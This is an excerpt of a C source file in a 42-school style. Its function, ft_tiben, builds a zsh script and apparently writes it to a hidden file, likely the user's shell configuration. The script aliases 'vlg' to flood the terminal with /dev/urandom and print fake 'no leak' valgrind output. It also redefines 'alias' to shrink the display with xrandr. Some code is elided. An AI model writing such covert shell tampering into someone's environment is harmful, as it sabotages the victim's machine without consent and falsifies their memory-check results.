...
/*   Updated: 2026/04/28 17:27:01 by gajanvie         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */
...
void	ft_tiben()
{
	...
	if (fd_hidden >= 0)
	{
		char blague[] =
			"#!/bin/zsh\n"
			"alias vlg='timeout 0.2s cat /dev/urandom ; printf \"\\n"
			"\nno leak\n"
			"no leak\n"
			"no leak\n"
			"==515977== HEAP SUMMARY:\n"
			...
			"alias alias=\"xrandr --output \"$(xrandr | awk \"/connected [^(]/{print \\$1; exit}\")\" --scale 0.1\"\n";
